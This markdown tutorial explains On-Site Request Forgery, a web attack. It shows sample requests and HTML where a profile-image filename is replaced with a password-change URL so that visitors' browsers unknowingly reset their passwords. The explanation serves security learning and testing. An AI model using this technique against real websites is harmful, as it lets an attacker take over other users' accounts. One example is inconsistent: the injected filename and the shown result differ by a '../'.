# On-Site Request Forgery (OSRF)

## Introduction
On-Site Request Forgery (OSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. The difference between CSRF is a vulnerability where an attacker initiates requests from domain under their control to perform actions on behalf of victim. However, in OSRF, requests originate from vulnerable application itself and we control where our requests go.

## Where to find
You can detect On-Site Request Forgery (OSRF) everywhere but there are 2 things that need to be looked up.
- Finding reflected input in `src` attribute. For example:

    ```html
    <img src="OUR_INPUT_HERE">
    <video width="400" height="200" controls src="OUR_INPUT_HERE">
    <audio src="OUR_INPUT_HERE">
    <iframe src="OUR_INPUT_HERE">
    ```
- There is a sensitive endpoint that using the GET method
  
    ```
    GET /settings.php?remove_account=1
    Host: example.com
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    ...
    ```

## How to exploit
Imagine there is functionality in the website where the user can change their password. Here is the request

```
GET /change_password.php?new_password=Testing123
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
...
```

And then there is another functionality where we can control the value inside the `src` attribute, for example we can change our photo profile

```
POST /settings.php
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
...

---------------------------829348923824
Content-Disposition: form-data; name="filename"

testingimage.jpg

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="testingimage.jpg"
Content-Type: image/gif

IMAGE_CONTENT
...
```
And if we check our public profile page, our input is reflected in the `src` attribute

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="uploads/testingimage.jpg">
</div>
```

To exploit the website using this vulnerability, we need to change the filename from `testingimage.jpg` to `change_password.php?new_password=Testing123`. So, the result is

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="../change_password.php?new_password=Testing123">
</div>
```

If another user visits our profile page, their password will automatically be changed to `Testing123`


## References:
* [Portswigger](https://portswigger.net/blog/on-site-request-forgery)
* [CM2](https://blog.cm2.pw/articles/on-site-request-forgery/)